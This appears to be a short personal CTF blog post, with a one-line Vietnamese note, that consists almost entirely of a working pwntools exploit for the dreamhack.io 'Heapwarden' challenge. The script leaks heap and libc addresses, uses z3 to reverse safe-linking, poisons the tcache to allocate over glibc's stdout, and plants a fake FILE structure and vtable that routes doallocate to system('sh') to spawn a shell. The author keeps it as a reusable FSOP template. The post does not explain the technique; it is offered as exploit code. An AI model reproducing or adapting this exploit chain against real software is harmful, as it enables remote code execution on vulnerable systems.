---
title: Heapwarden - dreamhack.io
date: 2026-03-19 11:13:00
tags: ['dreamhack.io']
---

Lười viết writeup (vứt lên đây để lưu template fsop)

### Exploit

```py
#!/usr/bin/env python3

from pwn import *

from z3 import *

exe = ELF("./heapwarden_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main", env={'SHELL': '/bin/bash'})
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214", env={'SHELL': '/bin/bash'})
    else:
        r = remote("host8.dreamhack.games", 18105)

    return r

def add (p, sz, len, data):
    p.sendlineafter (b'> ', b'1')
    p.sendlineafter (b'size: ', sz)
    p.sendlineafter (b'data_len: ', len)
    p.sendline (data)

def free (p, idx):
    p.sendlineafter (b'> ', b'2')
    p.sendlineafter (b'index: ', idx)

def edit (p, idx, offset, len, data):
    p.sendlineafter (b'> ', b'3')
    p.sendlineafter (b'index: ', idx)
    p.sendlineafter (b'offset: ', offset)
    p.sendlineafter (b'length: ', len)
    p.send (data)

def show (p, idx, offset, len):
    p.sendlineafter (b'> ', b'4')
    p.sendlineafter (b'index: ', idx)
    p.sendlineafter (b'offset: ', offset)
    p.sendlineafter (b'length: ', len)

def dispatch (p):
    p.sendlineafter (b'> ', b'5')

def solve_A(x_val, y_val, C_val, bit_size=64):
    A = BitVec('A', bit_size)
    
    x = BitVecVal(x_val, bit_size)
    y = BitVecVal(y_val, bit_size)
    C = BitVecVal(C_val, bit_size)
    
    equation = C == LShR(A + x, 12) ^ (A + y)
    
    s = Solver()
    s.add(equation)
    
    if s.check() == sat:
        model = s.model()
        A_result = model[A].as_long()
        return A_result
    else:
        print("[-] No solution found. Check if the inputs are correct or if the integer sizes differ.")
        return None


def main():
    p = conn()
    dis = []
    payload = b'A' * 16 + p64 (0) + p64 (0x421)
    add (p, b'50', b'33', payload)
    sz = 0x30
    element_count = 1
    dis.append (0)
    for i in range (16):
        element_count += 1
        dis.append (dis[-1] + sz + 0x10)
        add (p, str (sz).encode ('utf-8'), b'10', b'A' * 9)
    # This is okay

    free_ls = []
    reset_ls = []
    desired_range = element_count - 1
    check = False

    while len (free_ls) != 2:
        dis.append (dis[-1] + sz + 0x10)

        for i in range (element_count):
            if (i in free_ls) or (i in reset_ls):
                continue
            free (p, str (i).encode ('utf-8'))
            response = p.recv (2)
            if (response == b'ok'):
                    reset_ls.append (i)
                    for j in range (desired_range):
                        if (j in free_ls) or (j in reset_ls):
                            continue
                        show (p, str (j).encode('utf-8'), b'0', b'2')
                        response = p.recv (4)
                        if check == False:
                            sz += 0x10
                            check = True
                        if (response != b'4141'):
                            free_ls.append (j)
                            break
        
        add (p, str (sz).encode (), b'10', b'A' * 9)
        element_count += 1
        if sz == 0x30:
            desired_range += 1
        
    print ("BUGGG ", free_ls)             
    show (p, str (free_ls[-1]).encode ('utf-8'), b'0', b'8')
    tmp = p.recvuntil (b'\n')
    tmp = tmp.decode()[:-1]
    print (tmp)
    leak_heap = ''
    for i in range(len (tmp) - 1, 0, -2):
        print ("BUG ", i)
        leak_heap += (tmp[i - 1] + tmp[i])
    
    leak_heap = '0x' + leak_heap
    leak_heap = int (leak_heap, 16)
    print ("The leak from heap is: ", hex (leak_heap))
    heap_addr = solve_A (dis[free_ls[-1]] + 0x490 + 0x10, dis[free_ls[0]] + 0x490 + 0x10, leak_heap)
    print ("The address of heap is: ", hex (heap_addr))
    fake_chunk_adrr = heap_addr + 0x4b0
    print ("The address of fake_chunk is: ", hex (fake_chunk_adrr))
    second_freed_chunk = heap_addr + 0x490 + dis[free_ls[-1]]
    print ("The address of second freed chunk is: ", hex (second_freed_chunk))

    payload = ((second_freed_chunk + 0x10) >> 12) ^ (fake_chunk_adrr + 0x10)
    edit (p, str (free_ls[0]).encode ('utf-8'), b'0', b'16', b'A' * 16)
    edit (p, str (free_ls[-1]).encode('utf-8'), b'0', b'8', p64 (payload))

    add (p, b'50', b'10', b'A' * 9)
    add (p, b'50', b'10', b'A' * 9)
    element_count += 2
    target = element_count - 1
    dis.append (0)
    dis.append (0)

    add (p, str (0x200).encode ('utf-8'), b'10', b'A' * 9)
    add (p, str (0x200).encode ('utf-8'), b'10', b'A' * 9)
    dis.append (dis[len (dis) - 3] + sz + 0x10)
    dis.append (dis[-1] + 0x210)
    element_count += 2
    targets_array = []
    targets_array.append (element_count - 1)
    targets_array.append (element_count - 2)

    for i in range (300 - element_count):
        print ("BUGG ", element_count)
        print ("The address of heap is: ", hex (heap_addr))
        add (p, b'32', b'10', b'A' * 9)
        element_count += 1

    fake_chunk_freed = False
    libc_leak = b''
    stt = []

    for i in range (element_count):
        if (i == target) or (i in targets_array) or (i in reset_ls):
            continue
        free (p, str (i).encode('utf-8'))
        response = p.recv (2)
        if response == b'ok':
            reset_ls.append (i)
            if fake_chunk_freed == False:
                show (p, str (target).encode('utf-8'), b'0', b'8')
                response = p.recv (16)
                if response != b'41' * 8:
                    fake_chunk_freed = True
                    libc_leak = response
            
            for j in targets_array:
                if j in stt:
                    continue
                show (p, str (j).encode('utf-8'), b'0', b'2')
                response = p.recv (4)
                if response != b'4141':
                    stt.append (j)
    
    print ("BUGGGG", libc_leak)
    libc_leak = libc_leak.decode()
    main_arena = ''
    for i in range(len (libc_leak) - 1, 0, -2):
        main_arena += (libc_leak[i - 1] + libc_leak[i])

    main_arena = int ('0x' + main_arena, 16)
    libc.address = main_arena - libc.symbols['main_arena'] - 96
    print ("The address of main_arena is: ", hex (main_arena))
    print ("The address of libc is: ", hex (libc.address))
    print ("BUG", stt)
    
    print ("BUG1", len (dis))
    payload = (heap_addr + dis[stt[-1]] + 0x490 + 0x10) >> 12
    payload = payload ^ libc.symbols["_IO_2_1_stdout_"]
    payload = p64 (payload)
    edit (p, str (stt[-1]).encode ('utf-8'), b'0', b'8', payload)



    lock_addr = libc.address + 0x21ca70
    stdout_addr = libc.sym['_IO_2_1_stdout_']
    system_addr = libc.sym['system']
    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']

    fake_file = flat({
        0x00: b"  sh\x00\x00\x00\x00", # _flags & system() argument
        0x28: p64(0),                 # _IO_write_ptr (must be >= _IO_write_base)
        0x88: p64(lock_addr),         # _lock (must be valid writable memory)
        0xa0: p64(stdout_addr),       # _wide_data (pointed back at stdout itself)
        0xd8: p64(_IO_wfile_jumps)    # vtable overwrite
    }, filler=b'\x00', length=0xe0)

    fake_wide_vtable_addr = stdout_addr + 0xe8
    fake_file += p64(fake_wide_vtable_addr)

    fake_vtable = flat({
        0x68: p64(system_addr)        # doallocate -> system
    }, filler=b'\x00', length=0x70)

    payload = fake_file + fake_vtable


    add (p, str (0x200).encode ('utf-8'), b'10', b'A' * 9)
    add (p, str (0x200).encode ('utf-8'), str (len (payload) + 1).encode('utf-8'), payload)

    # p.sendlineafter (b'> ', b'0')

    p.interactive()


if __name__ == "__main__":
    main()
```